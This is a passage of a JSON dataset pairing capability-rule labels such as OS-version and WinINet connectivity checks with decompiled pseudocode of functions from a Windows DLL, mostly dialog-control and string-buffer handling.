< iVar8);\n    if (cVar12 == '\\0') {\n        uStack48 = 0x1800287af;\n        uVar9 = (**0x1800de798)(*(arg1 + 0x18), 0x23b6);\n        uStack48 = 0x1800287ba;\n        (**0x1800de770)(uVar9, 0);\n        uStack48 = 0x1800287c9;\n        uVar9 = (**0x1800de798)(*(arg1 + 0x18), 0x23b7);\n        uStack48 = 0x1800287d4;\n        (**0x1800de770)(uVar9, 0);\n    }\n    else {\n        uStack48 = 0x18002879e;\n        fcn.1800285a0(arg1);\n    }\n    if (((*(arg1 + 0x62) == '\\0') || (*(arg1 + 99) == '\\0')) || (*(arg1 + 100) == '\\0')) {\n        cVar12 = '\\0';\n    }\n    else {\n        cVar12 = '\\x01';\n    }\n    uStack48 = 0x180027c6c;\n    iVar8 = (**0x1800de7f0)(*(arg1 + 0x70), 0x18b, 0, 0);\n    cVar2 = *(arg1 + 0x62);\n    uStack48 = 0x180027c89;\n    uVar9 = (**0x1800de798)(*(arg1 + 0x18), 0x23a5);\n    uStack48 = 0x180027c94;\n    (**0x1800de718)(uVar9, -(cVar2 != '\\0') & 5);\n    uVar9 = 5;\n    if (*(arg1 + 0x62) != '\\0') {\n        uVar9 = 0;\n    }\n    uStack48 = 0x180027cb1;\n    uVar10 = (**0x1800de798)(*(arg1 + 0x18), 0x23a4);\n    uStack48 = 0x180027cbc;\n    (**0x1800de718)(uVar10, uVar9);\n    uStack48 = 0x180027ccc;\n    (**0x1800de770)(*(arg1 + 0x70), cVar12);\n    uStack48 = 0x180027cdb;\n    uVar9 = (**0x1800de798)(*(arg1 + 0x18), 0x23a5);\n    uStack48 = 0x180027ce6;\n    (**0x1800de770)(uVar9, cVar12);\n    uStack48 = 0x180027cf5;\n    uVar9 = (**0x1800de798)(*(arg1 + 0x18), 0x23a6);\n    uStack48 = 0x180027d00;\n    (**0x1800de770)(uVar9, cVar12);\n    uStack48 = 0x180027d16;\n    uVar9 = (**0x1800de798)(*(arg1 + 0x18), 0x23a7);\n    uStack48 = 0x180027d21;\n    (**0x1800de770)(uVar9, 0 < iVar8);\n    uStack48 = 0x180027d30;\n    uVar9 = (**0x1800de798)(*(arg1 + 0x18), 0x23eb);\n    uStack48 = 0x180027d3b;\n    (**0x1800de770)(uVar9, cVar12);\n    uStack48 = 0x180027d4a;\n    uVar9 = (**0x1800de798)(*(arg1 + 0x18), 0x23ec);\n    uStack48 = 0x180027d55;\n    (**0x1800de770)(uVar9, cVar12);\n    if (cVar12 == '\\0') {\n        uStack48 = 0x180027d73;\n        uVar9 = (**0x1800de798)(*(arg1 + 0x18), 0x238f);\n        uStack48 = 0x180027d7e;\n        (**0x1800de770)(uVar9, 0);\n        uStack48 = 0x180027d8d;\n        uVar9 = (**0x1800de798)(*(arg1 + 0x18), 0x2390);\n        uStack48 = 0x180027d98;\n        (**0x1800de770)(uVar9, 0);\n    }\n    else {\n        uStack48 = 0x180027d62;\n        fcn.180027b60(arg1);\n    }\n    uStack24 = 0xfffffffffffffffe;\n    if (*(arg1 + 0x61) == '\\0') {\n        uStack72 = CONCAT44(*0x180101904, *0x180101900);\n        uStack64 = *0x180101908;\n        uStack60 = *0x18010190c;\n        uStack88 = 0;\n        fcn.180010d70(&stack0xffffffffffffffa8, 0x1800f5fa8, 0x1e);\n        uVar5 = uStack72;\n        if (CONCAT44(uStack60, uStack64) == uStack72) {\n            puVar7 = fcn.180013690(&stack0xffffffffffffffa8, 1, 0, 0x1800f4b2c);\n        }\n        else {\n            uVar1 = uStack72 + 1;\n            uStack72 = uVar1;\n            puVar6 = &stack0xffffffffffffffa8;\n            if (7 < CONCAT44(uStack60, uStack64)) {\n                puVar6 = CONCAT62(Stack86, uStack88);\n            }\n            *(puVar6 + uVar5 * 2) = 0x2a;\n            *(puVar6 + uVar1 * 2) = 0;\n            puVar7 = &stack0xffffffffffffffa8;\n        }\n        uStack56 = *puVar7;\n        uStack54 = *puVar7 >> 0x10;\n        uStack52 = puVar7[1];\n        uStack48 = *(puVar7 + 2);\n        uStack40 = *(puVar7 + 4);\n        uStack32 = *(puVar7 + 6);\n        *(puVar7 + 4) = 0;\n        *(puVar7 + 6) = 7;\n        *puVar7 = 0;\n        puVar6 = &stack0xffffffffffffffc8;\n        if (7 < uStack32) {\n            puVar6 = CONCAT44(uStack52, CONCAT22(uStack54, uStack56));\n        }\n        (**0x1800de788)(*(arg1 + 0x18), 0x23e7, puVar6);\n        if (uStack32 < 8) {\ncode_r0x000180022573:\n            uStack40 = CONCAT44(*0x180101904, *0x180101900);\n            uStack32 = CONCAT44(*0x18010190c, *0x180101908);\n            uStack56 = 0;\n            if (CONCAT44(uStack60, uStack64) < 8) {\ncode_r0x0001800225c4:\n                fcn.180068600(*(arg1 + 0x18), 0x23e7);\n                goto code_r0x0001800225d2;\n            }\n            iVar11 = CONCAT62(Stack86, uStack88);\n            iVar8 = iVar11;\n            if ((CONCAT44(uStack60, uStack64) * 2 + 2 < 0x1000) ||\n               (iVar8 = *(iVar11 + -8),  (iVar11 - iVar8) - 8U < 0x20)) {\n                fcn.18008fb24(iVar8);\n                goto code_r0x0001800225c4;\n            }\n        }\n        else {\n            iVar11 = CONCAT44(uStack52, CONCAT22(uStack54, uStack56));\n            iVar8 = iVar11;\n            if ((uStack32 * 2 + 2 < 0x1000) || (iVar8 = *(iVar11 + -8),  (iVar11 - iVar8) - 8U < 0x20)) {\n                fcn.18008fb24(iVar8);\n                goto code_r0x000180022573;\n            }\ncode_r0x000180022a85:\n            fcn.1800b3528();\n        }\n        fcn.1800b3528();\ncode_r0x000180022a91:\n        fcn.1800b3528();\ncode_r0x000180022a97:\n        fcn.1800b3528();\ncode_r0x000180022a9d:\n        fcn.1800b3528();\n    }\n    else {\n        (**0x1800de788)(*(arg1 + 0x18), 0x23e7, 0x1800f5f68);\n        fcn.180068540(*(arg1 + 0x18), 0x23e7);\ncode_r0x0001800225d2:\n        if (*(arg1 + 0x62) == '\\0') {\n            uStack72 = CONCAT44(*0x180101904, *0x180101900);\n            uStack64 = *0x180101908;\n            uStack60 = *0x18010190c;\n            uStack88 = 0;\n            fcn.180010d70(&stack0xffffffffffffffa8, 0x1800f5ff8, 6);\n            uVar5 = uStack72;\n            if (CONCAT44(uStack60, uStack64) == uStack72) {\n                puVar7 = fcn.180013690(&stack0xffffffffffffffa8, 1, 0, 0x1800f4b3c);\n            }\n            else {\n                uVar1 = uStack72 + 1;\n                uStack72 = uVar1;\n                puVar6 = &stack0xffffffffffffffa8;\n                if (7 < CONCAT44(uStack60, uStack64)) {\n                    puVar6 = CONCAT62(Stack86, uStack88);\n                }\n                *(puVar6 + uVar5 * 2) = 0x2a;\n                *(puVar6 + uVar1 * 2) = 0;\n                puVar7 = &stack0xffffffffffffffa8;\n            }\n            uStack56 = *puVar7;\n            uStack54 = *puVar7 >> 0x10;\n            uStack52 = puVar7[1];\n            uStack48 = *(puVar7 + 2);\n            uStack40 = *(puVar7 + 4);\n            uStack32 = *(puVar7 + 6);\n            *(puVar7 + 4) = 0;\n            *(puVar7 + 6) = 7;\n            *puVar7 = 0;\n            puVar6 = &stack0xffffffffffffffc8;\n            if (7 < uStack32) {\n                puVar6 = CONCAT44(uStack52, CONCAT22(uStack54, uStack56));\n            }\n            (**0x1800de788)(*(arg1 + 0x18), 0x23a3, puVar6);\n            if (7 < uStack32) {\n                iVar11 = CONCAT44(uStack52, CONCAT22(uStack54, uStack56));\n                iVar8 = iVar11;\n                if ((uStack32 * 2 + 2 < 0x1000) || (iVar8 = *(iVar11 + -8),  (iVar11 - iVar8) - 8U < 0x20)) {\n                    fcn.18008fb24(iVar8);\n                    goto code_r0x0001800226fb;\n                }\n                goto code_r0x000180022a91;\n            }\ncode_r0x0001800226fb:\n            uStack40 = CONCAT44(*0x180101904, *0x180101900);\n            uStack32 = CONCAT44(*0x18010190c, *0x180101908);\n            uStack56 = 0;\n            if (CONCAT44(uStack60, uStack64) < 8) {\ncode_r0x00018002274c:\n                fcn.180068600(*(arg1 + 0x18), 0x23a3);\n                goto code_r0x00018002275a;\n            }\n            iVar11 = CONCAT62(Stack86, uStack88);\n            iVar8 = iVar11;\n            if ((CONCAT44(uStack60, uStack64) * 2 + 2 < 0x1000) ||\n               (iVar8 = *(iVar11 + -8),  (iVar11 - iVar8) - 8U < 0x20)) {\n                fcn.18008fb24(iVar8);\n                goto code_r0x00018002274c;\n            }\n            goto code_r0x000180022a97;\n        }\n        (**0x1800de788)(*(arg1 + 0x18), 0x23a3, 0x1800f5fe8);\n        fcn.180068540(*(arg1 + 0x18), 0x23a3);\ncode_r0x00018002275a:\n        if (*(arg1 + 99) != '\\0') {\n            (**0x1800de788)(*(arg1 + 0x18), 0x23c3, 0x1800f6008);\n            fcn.180068540(*(arg1 + 0x18), 0x23c3);\ncode_r0x0001800228e2:\n            if (*(arg1 + 100) != '\\0') {\n                (**0x1800de788)(*(arg1 + 0x18), 0x23d8, 0x1800f6028);\n                fcn.180068540(*(arg1 + 0x18), 0x23d8);\n                return;\n            }\n            uStack72 = CONCAT44(*0x180101904, *0x180101900);\n            uStack64 = *0x180101908;\n            uStack60 = *0x18010190c;\n            uStack88 = 0;\n            fcn.180010d70(&stack0xffffffffffffffa8, 0x1800f6038, 6);\n            uVar5 = uStack72;\n            if (CONCAT44(uStack60, uStack64) == uStack72) {\n                puVar7 = fcn.180013690(&stack0xffffffffffffffa8, 1, 0, 0x1800f4b9c);\n            }\n            else {\n                uVar1 = uStack72 + 1;\n                uStack72 = uVar1;\n                puVar6 = &stack0xffffffffffffffa8;\n                if (7 < CONCAT44(uStack60, uStack64)) {\n                    puVar6 = CONCAT62(Stack86, uStack88);\n                }\n                *(puVar6 + uVar5 * 2) = 0x2a;\n                *(puVar6 + uVar1 * 2) = 0;\n                puVar7 = &stack0xffffffffffffffa8;\n            }\n            uStack56 = *puVar7;\n            uStack54 = *puVar7 >> 0x10;\n            uStack52 = puVar7[1];\n            uStack48 = *(puVar7 + 2);\n            uStack40 = *(puVar7 + 4);\n            uStack32 = *(puVar7 + 6);\n            *(puVar7 + 4) = 0;\n            *(puVar7 + 6) = 7;\n            *puVar7 = 0;\n            puVar6 = &stack0xffffffffffffffc8;\n            if (7 < uStack32) {\n                puVar6 = CONCAT44(uStack52, CONCAT22(uStack54, uStack56));\n            }\n            (**0x1800de788)(*(arg1 + 0x18), 0x23d8, puVar6);\n            if (7 < uStack32) {\n                iVar11 = CONCAT44(uStack52, CONCAT22(uStack54, uStack56));\n                iVar8 = iVar11;\n                if ((0xfff < uStack32 * 2 + 2) && (iVar8 = *(iVar11 + -8),  0x1f < (iVar11 - iVar8) - 8U))\n                goto code_r0x000180022aa9;\n                fcn.18008fb24(iVar8);\n            }\n            uStack40 = CONCAT44(*0x180101904, *0x180101900);\n            uStack32 = CONCAT44(*0x18010190c, *0x180101908);\n            uStack56 = 0;\n            if (CONCAT44(uStack60, uStack64) < 8) goto code_r0x000180022a58;\n            iVar8 = CONCAT44(uStack60, uStack64) * 2;\n            iVar4 = CONCAT62(Stack86, uStack88);\n            iVar11 = iVar4;\n            if (0xfff < iVar8 + 2U) {\n                iVar11 = *(iVar4 + -8);\n                if (0x1f < (iVar4 - iVar11) - 8U) {\n                    fcn.1800b3528(uStack40, iVar11, iVar8 + 0x29);\n                    goto code_r0x000180022a85;\n                }\n            }\n            fcn.18008fb24(iVar11);\ncode_r0x000180022a58:\n            fcn.180068600(*(arg1 + 0x18), 0x23d8);\n            return;\n        }\n        uStack72 = CONCAT44(*0x180101904, *0x180101900);\n        uStack64 = *0x180101908;\n        uStack60 = *0x18010190c;\n        uStack88 = 0;\n        fcn.180010d70(&stack0xffffffffffffffa8, 0x1800f6018, 6);\n        uVar5 = uStack72;\n        if (CONCAT44(uStack60, uStack64) == uStack72) {\n            puVar7 = fcn.180013690(&stack0xffffffffffffffa8, 1, 0, 0x1800f4b8c);\n        }\n        else {\n            uVar1 = uStack72 + 1;\n            uStack72 = uVar1;\n            puVar6 = &stack0xffffffffffffffa8;\n            if (7 < CONCAT44(uStack60, uStack64)) {\n                puVar6 = CONCAT62(Stack86, uStack88);\n            }\n            *(puVar6 + uVar5 * 2) = 0x2a;\n            *(puVar6 + uVar1 * 2) = 0;\n            puVar7 = &stack0xffffffffffffffa8;\n        }\n        uStack56 = *puVar7;\n        uStack54 = *puVar7 >> 0x10;\n        uStack52 = puVar7[1];\n        uStack48 = *(puVar7 + 2);\n        uStack40 = *(puVar7 + 4);\n        uStack32 = *(puVar7 + 6);\n        *(puVar7 + 4) = 0;\n        *(puVar7 + 6) = 7;\n        *puVar7 = 0;\n        puVar6 = &stack0xffffffffffffffc8;\n        if (7 < uStack32) {\n            puVar6 = CONCAT44(uStack52, CONCAT22(uStack54, uStack56));\n        }\n        (**0x1800de788)(*(arg1 + 0x18), 0x23c3, puVar6);\n        if (7 < uStack32) {\n            iVar11 = CONCAT44(uStack52, CONCAT22(uStack54, uStack56));\n            iVar8 = iVar11;\n            if ((uStack32 * 2 + 2 < 0x1000) || (iVar8 = *(iVar11 + -8),  (iVar11 - iVar8) - 8U < 0x20)) {\n                fcn.18008fb24(iVar8);\n                goto code_r0x000180022883;\n            }\n            goto code_r0x000180022a9d;\n        }\ncode_r0x000180022883:\n        uStack40 = CONCAT44(*0x180101904, *0x180101900);\n        uStack32 = CONCAT44(*0x18010190c, *0x180101908);\n        uStack56 = 0;\n        if (CONCAT44(uStack60, uStack64) < 8) {\ncode_r0x0001800228d4:\n            fcn.180068600(*(arg1 + 0x18), 0x23c3);\n            goto code_r0x0001800228e2;\n        }\n        iVar11 = CONCAT62(Stack86, uStack88);\n        iVar8 = iVar11;\n        if ((CONCAT44(uStack60, uStack64) * 2 + 2 < 0x1000) || (iVar8 = *(iVar11 + -8),  (iVar11 - iVar8) - 8U < 0x20))\n        {\n            fcn.18008fb24(iVar8);\n            goto code_r0x0001800228d4;\n        }\n    }\n    fcn.1800b3528();\ncode_r0x000180022aa9:\n    fcn.1800b3528();\n    pcVar3 = swi(3);\n    (*pcVar3)();\n    return;\n}\n",
        "token_count": 5560
    },
    "18002880": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_9h\n// WARNING: Variable defined which should be unmapped: var_11h\n// WARNING: Variable defined which should be unmapped: var_19h\n// WARNING: Variable defined which should be unmapped: var_29h\n// WARNING: Variable defined which should be unmapped: var_31h\n\nvoid fcn.180028800(int64_t arg1, ulong arg2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    ulong ****ppppuVar3;\n    ulong ***pppuVar4;\n    int64_t iVar5;\n    ulong ****arg1_00;\n    int64_t iVar6;\n    ulong *puVar7;\n    int64_t iVar8;\n    int64_t iVar9;\n    ulong var_fh;\n    ulong var_17h;\n    uchar auStack280 [32];\n    int32_t iStack248;\n    ulong uStack240;\n    ulong ****appppuStack232 [2];\n    ulong uStack216;\n    uint64_t uStack208;\n    ulong ****appppuStack200 [2];\n    ulong uStack184;\n    uint64_t uStack176;\n    ulong ****appppuStack168 [2];\n    ulong uStack152;\n    uint64_t uStack144;\n    uchar auStack136 [7];\n    ulong var_79h;\n    ulong var_71h;\n    uint64_t var_69h;\n    uchar auStack104 [7];\n    ulong var_59h;\n    ulong var_51h;\n    uint64_t var_49h;\n    uchar auStack72 [7];\n    ulong var_39h;\n    ulong var_31h;\n    ulong var_29h;\n    ulong var_19h;\n    ulong var_11h;\n    ulong var_9h;\n    \n    uStack240 = 0xfffffffffffffffe;\n    _auStack72 = *0x180123080 ^ auStack280;\n    iVar1 = (**0x1800de7f0)(*(arg1 + 0x70), 0x188, 0, 0);\n    if ((iVar1 != -1) && (iVar2 = (**0x1800de7f0)(*(arg1 + 0xb8), 0x188, 0, 0),  iVar2 != -1)) {\n        iVar9 = iVar1 * 0xf0 + *(arg1 + 0xd8);\n        if (arg2 == -1) {\n            if (iVar2 == 0) goto code_r0x0001800288c6;\n        }\n        else if ((arg2 != 1) || ((*(iVar9 + 0x70) - *(iVar9 + 0x68)) / 0xa0 + -1 <= iVar2)) goto code_r0x0001800288c6;\n        iVar6 = iVar2 * 0xa0;\n        iVar5 = *(iVar9 + 0x68) + iVar6;\n        fcn.18000da90(appppuStack232, iVar5);\n        fcn.18000da90(appppuStack200, iVar5 + 0x20);\n        fcn.18000da90(appppuStack168, iVar5 + 0x40);\n        fcn.18000da90(auStack136, iVar5 + 0x60);\n        fcn.18000da90(auStack104, iVar5 + 0x80);\n        iStack248 = arg2 + iVar2;\n        iVar8 = iStack248;\n        iVar5 = iVar8 * 0xa0;\n        fcn.180028ac0(iVar6 + *(iVar9 + 0x68), iVar5 + *(iVar9 + 0x68));\n        arg1_00 = *(iVar9 + 0x68) + iVar5;\n        if (arg1_00 != appppuStack232) {\n            ppppuVar3 = appppuStack232;\n            if (7 < uStack208) {\n                ppppuVar3 = appppuStack232[0];\n            }\n            fcn.180010d70(arg1_00, ppppuVar3, uStack216);\n        }\n        if (arg1_00 + 4 != appppuStack200) {\n            ppppuVar3 = appppuStack200;\n            if (7 < uStack176) {\n                ppppuVar3 = appppuStack200[0];\n            }\n            fcn.180010d70(arg1_00 + 4, ppppuVar3, uStack184);\n        }\n        if (arg1_00 + 8 != appppuStack168) {\n            ppppuVar3 = appppuStack168;\n            if (7 < uStack144) {\n                ppppuVar3 = appppuStack168[0];\n            }\n            fcn.180010d70(arg1_00 + 8, ppppuVar3, uStack152);\n        }\n        if (arg1_00 + 0xc != auStack136) {\n            pppuVar4 = auStack136;\n            if (7 < stack0xffffffffffffff90) {\n                pppuVar4 = _auStack136;\n            }\n            fcn.180010d70(arg1_00 + 0xc, pppuVar4, stack0xffffffffffffff88);\n        }\n        if (arg1_00 + 0x10 != auStack104) {\n            pppuVar4 = auStack104;\n            if (7 < stack0xffffffffffffffb0) {\n                pppuVar4 = _auStack104;\n            }\n            fcn.180010d70(arg1_00 + 0x10, pppuVar4, stack0xffffffffffffffa8);\n        }\n        (**0x1800de7f0)(*(arg1 + 0xb8), 0x182, iVar2, 0);\n        puVar7 = *(iVar9 + 0x68) + iVar5;\n        if (7 < puVar7[3]) {\n            puVar7 = *puVar7;\n        }\n        (**0x1800de7f0)(*(arg1 + 0xb8), 0x181, iVar8, puVar7);\n        (**0x1800de7f0)(*(arg1 + 0xb8), 0x186, iVar8, 0);\n        *(arg1 + 0x61) = 0;\n        fcn.180022420(arg1);\n        fcn.1800285a0(arg1);\n        fcn.1800252e0(appppuStack232);\n    }\ncode_r0x0001800288c6:\n    fcn.18008fb00(_auStack72 ^ auStack280);\n    return;\n}\n",
        "token_count": 1480
    },
    "180028b8": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.180028b80(int64_t arg1)\n\n{\n    int32_t *piVar1;\n    ulong *puVar2;\n    code *pcVar3;\n    int64_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    ulong *puVar7;\n    ulong noname_0;\n    int64_t arg1_00;\n    ulong ****ppppuVar8;\n    ushort *puVar9;\n    uchar *puVar10;\n    ulong var_70h;\n    uchar auStack408 [48];\n    ulong *puStack360;\n    uchar auStack352 [24];\n    int64_t *piStack328;\n    ulong *puStack320;\n    uchar auStack312 [24];\n    int64_t *piStack288;\n    ulong uStack280;\n    ushort uStack272;\n    unkbyte6 Stack270;\n    ulong uStack256;\n    uint64_t uStack248;\n    ulong ****appppuStack240 [3];\n    uint64_t uStack216;\n    uchar auStack200 [64];\n    ulong var_80h;\n    ulong var_78h;\n    ulong var_68h;\n    ulong var_bp_60h;\n    ulong var_58h;\n    ulong var_40h;\n    ulong var_30h;\n    uint64_t uStack40;\n    \n    uStack280 = 0xfffffffffffffffe;\n    uStack40 = *0x180123080 ^ auStack408;\n    noname_0 = *(arg1 + 0x70);\n    iVar5 = (**0x1800de7f0)(noname_0, 0x188, 0, 0);\n    if (iVar5 == -1) {\ncode_r0x000180028c15:\n        fcn.1800276c0(noname_0, auStack200);\n        puVar10 = auStack200;\n        fcn.1800252e0(auStack200);\n    }\n    else {\n        noname_0 = *(arg1 + 0xb8);\n        iVar6 = (**0x1800de7f0)(noname_0, 0x188, 0, 0);\n        if (iVar6 == -1) goto code_r0x000180028c15;\n        puVar10 = iVar6 * 0xa0 + *(iVar5 * 0xf0 + 0x68 + *(arg1 + 0xd8));\n    }\n    puStack360 = NULL;\n    fcn.180010540(auStack352);\n    fcn.1800131f0(&puStack360, 0x1800f616c, 0x1800f616e);\n    fcn.180013060(appppuStack240, puVar10 + 0x40, &puStack360, 0x1800f649c);\n    if (puStack360 != NULL) {\n        LOCK();\n        piVar1 = puStack360 + 0x2c;\n        iVar5 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n        puVar7 = puStack360;\n        if (iVar5 == 1) {\n            while (puVar7 != NULL) {\n                puVar2 = puVar7[2];\n                puVar7[2] = 0;\n                (***puVar7)(puVar7, 1);\n                puVar7 = puVar2;\n            }\n        }\n    }\n    puStack360 = NULL;\n    if ((piStack328 != NULL) && (puVar7 = (**(*piStack328 + 0x10))(),  puVar7 != NULL)) {\n        (***puVar7)(puVar7, 1);\n    }\n    ppppuVar8 = appppuStack240;\n    if (7 < uStack216) {\n        ppppuVar8 = appppuStack240[0];\n    }\n    (**0x1800de778)(*(arg1 + 0x30), ppppuVar8);\n    puStack320 = NULL;\n    fcn.180010540(auStack312);\n    fcn.1800131f0(&puStack320, 0x1800f61b4, 0x1800f61b6);\n    fcn.180013060(&uStack272, puVar10 + 0x60, &puStack320, 0x1800f64a4);\n    if (puStack320 != NULL) {\n        LOCK();\n        piVar1 = puStack320 + 0x2c;\n        iVar5 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n        puVar7 = puStack320;\n        if (iVar5 == 1) {\n            while (puVar7 != NULL) {\n                puVar2 = puVar7[2];\n                puVar7[2] = 0;\n                (***puVar7)(puVar7, 1);\n                puVar7 = puVar2;\n            }\n        }\n    }\n    puStack320 = NULL;\n    if ((piStack288 != NULL) && (puVar7 = (**(*piStack288 + 0x10))(),  puVar7 != NULL)) {\n        (***puVar7)(puVar7, 1);\n    }\n    puVar9 = &uStack272;\n    if (7 < uStack248) {\n        puVar9 = CONCAT62(Stack270, uStack272);\n    }\n    (**0x1800de778)(*(arg1 + 0x38), puVar9);\n    *(arg1 + 100) = 1;\n    fcn.180028690(arg1);\n    if (7 < uStack248) {\n        iVar4 = CONCAT62(Stack270, uStack272);\n        arg1_00 = iVar4;\n        if ((0xfff < uStack248 * 2 + 2) && (arg1_00 = *(iVar4 + -8),  0x1f < (iVar4 - arg1_00) - 8U))\n        goto code_r0x000180028e7f;\n        fcn.18008fb24(arg1_00);\n    }\n    uStack256 = *0x180101900;\n    uStack248 = *0x180101908;\n    uStack272 = 0;\n    if (7 < uStack216) {\n        ppppuVar8 = appppuStack240[0];\n        if (0xfff < uStack216 * 2 + 2) {\n            ppppuVar8 = appppuStack240[0][-1];\n            if (0x1f < appppuStack240[0] + (-8 - ppppuVar8)) {\n                fcn.1800b3528(*0x180101900, ppppuVar8, uStack216 * 2 + 0x29);\ncode_r0x000180028e7f:\n                fcn.1800b3528();\n                pcVar3 = swi(3);\n                (*pcVar3)();\n                return;\n            }\n        }\n        fcn.18008fb24(ppppuVar8);\n    }\n    fcn.18008fb00(uStack40 ^ auStack408);\n    return;\n}\n",
        "token_count": 1570
    },
    "1800290c": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Type propagation algorithm not settling\n\nvoid fcn.1800290c0(int64_t arg1)\n\n{\n    int32_t *piVar1;\n    ulong *puVar2;\n    code *pcVar3;\n    int64_t iVar4;\n    uint uVar5;\n    uint uVar6;\n    uint uVar7;\n    uint uVar8;\n    int32_t iVar9;\n    int32_t iVar10;\n    uint *puVar11;\n    ulong *puVar12;\n    int64_t iVar13;\n    ulong *******pppppppuVar14;\n    ushort *puVar15;\n    ushort *puVar16;\n    int64_t iVar17;\n    int64_t iVar18;\n    uchar auStack728 [32];\n    ulong **ppuStack696;\n    ushort *puStack688;\n    uint uStack664;\n    ushort uStack656;\n    unkbyte6 Stack654;\n    uint uStack640;\n    uint uStack636;\n    uint uStack632;\n    uint uStack628;\n    ushort uStack624;\n    unkbyte6 Stack622;\n    uint uStack608;\n    uint uStack604;\n    uint uStack600;\n    uint uStack596;\n    ushort uStack592;\n    unkbyte6 Stack590;\n    uint uStack576;\n    uint uStack572;\n    uint uStack568;\n    uint uStack564;\n    uint uStack560;\n    uint uStack556;\n    uint uStack552;\n    uint uStack548;\n    uint uStack544;\n    uint uStack540;\n    uint uStack536;\n    uint uStack532;\n    uint uStack528;\n    uint uStack524;\n    uint uStack520;\n    uint uStack516;\n    uint uStack512;\n    uint uStack508;\n    uint uStack504;\n    uint uStack500;\n    ulong *puStack496;\n    uchar auStack488 [24];\n    int64_t *piStack464;\n    ulong *puStack456;\n    uchar auStack448 [24];\n    int64_t *piStack424;\n    ulong *puStack416;\n    uchar auStack408 [24];\n    int64_t *piStack384;\n    ulong *puStack376;\n    uchar auStack368 [24];\n    int64_t *piStack344;\n    ulong *puStack336;\n    uchar auStack328 [24];\n    int64_t *piStack304;\n    ushort uStack296;\n    unkbyte6 Stack294;\n    ulong uStack280;\n    uint64_t uStack272;\n    ushort uStack264;\n    unkbyte6 Stack262;\n    ulong uStack248;\n    uint64_t uStack240;\n    ulong uStack232;\n    ulong *******pppppppuStack224;\n    uchar auStack216 [8];\n    uchar auStack208 [8];\n    uchar auStack200 [8];\n    uint uStack192;\n    uint uStack188;\n    uint uStack184;\n    uint uStack180;\n    int64_t iStack176;\n    uint64_t uStack168;\n    ulong *******apppppppuStack160 [2];\n    ulong uStack144;\n    uint64_t uStack136;\n    ushort uStack128;\n    unkbyte6 Stack126;\n    uint uStack112;\n    uint uStack108;\n    uint uStack104;\n    uint uStack100;\n    ushort uStack96;\n    unkbyte6 Stack94;\n    uint uStack80;\n    uint uStack76;\n    uint uStack72;\n    uint uStack68;\n    ushort uStack64;\n    unkbyte6 Stack62;\n    uint uStack48;\n    uint uStack44;\n    uint uStack40;\n    uint uStack36;\n    uint64_t uStack32;\n    \n    uStack232 = 0xfffffffffffffffe;\n    uStack32 = *0x180123080 ^ auStack728;\n    uStack664 = 0;\n    if (((*(arg1 + 100) != '\\0') || (iVar9 = (**0x1800de7f0)(*(arg1 + 0x70), 0x188, 0, 0),  iVar9 == -1)) ||\n       (iVar10 = (**0x1800de7f0)(*(arg1 + 0xb8), 0x188, 0, 0),  iVar10 == -1)) goto code_r0x000180029d63;\n    iVar18 = iVar10 * 0xa0 + *(iVar9 * 0xf0 + 0x68 + *(arg1 + 0xd8));\n    uStack144 = 0;\n    uStack136 = 7;\n    apppppppuStack160[0] = apppppppuStack160[0] & 0xffffffffffff0000;\n    pppppppuStack224 = fcn.180011cf0(apppppppuStack160, 0x8008);\n    uStack144 = 0x8000;\n    uStack136 = 0x8007;\n    pppppppuVar14 = pppppppuStack224;\n    for (iVar13 = 0x8000; iVar13 != 0; iVar13 = iVar13 + -1) {\n        *pppppppuVar14 = 0;\n        pppppppuVar14 = pppppppuVar14 + 2;\n    }\n    *(pppppppuStack224 + 0x2000) = 0;\n    iStack176 = CONCAT44(*0x180101904, *0x180101900);\n    uStack168 = CONCAT44(*0x18010190c, *0x180101908);\n    uStack192._0_2_ = 0;\n    apppppppuStack160[0] = pppppppuStack224;\n    (**0x1800de5f0)(iStack176, *(arg1 + 0x30), pppppppuStack224, 0x8000);\n    puStack496 = NULL;\n    fcn.180010540(auStack488);\n    fcn.1800131f0(&puStack496, L\" *\\r\\n\", 0x1800f64b8);\n    pppppppuVar14 = apppppppuStack160;\n    if (7 < uStack136) {\n        pppppppuVar14 = apppppppuStack160[0];\n    }\n    uStack608 = *0x180101900;\n    uStack604 = *0x180101904;\n    uStack600 = *0x180101908;\n    uStack596 = *0x18010190c;\n    uStack624 = 0;\n    iVar13 = -1;\n    iVar17 = -1;\n    do {\n        iVar17 = iVar17 + 1;\n    } while (*(pppppppuVar14 + iVar17 * 2) != 0);\n    fcn.180010d70(&uStack624, pppppppuVar14, iVar17);\n    puVar11 = fcn.180013060(&uStack296, &uStack624, &puStack496, 0x1800f61cc);\n    if (&uStack192 == puVar11) {\ncode_r0x00018002933c:\n        if (7 < uStack272) {\n            iVar4 = CONCAT62(Stack294, uStack296);\n            iVar17 = iVar4;\n            if ((0xfff < uStack272 * 2 + 2) && (iVar17 = *(iVar4 + -8),  0x1f < (iVar4 - iVar17) - 8U))\n            goto code_r0x000180029d95;\n            fcn.18008fb24(iVar17);\n        }\n        uStack280 = CONCAT44(*0x180101904, *0x180101900);\n        uStack272 = CONCAT44(*0x18010190c, *0x180101908);\n        uStack296 = 0;\n        if (CONCAT44(uStack596, uStack600) < 8) {\ncode_r0x0001800293db:\n            uStack596 = *0x18010190c;\n            uStack600 = *0x180101908;\n            uStack604 = *0x180101904;\n            uStack608 = *0x180101900;\n            uStack624 = 0;\n            if (puStack496 != NULL) {\n                LOCK();\n                piVar1 = puStack496 + 0x2c;\n                iVar9 = *piVar1;\n                *piVar1 = *piVar1 + -1;\n                puVar12 = puStack496;\n                if (iVar9 == 1) {\n                  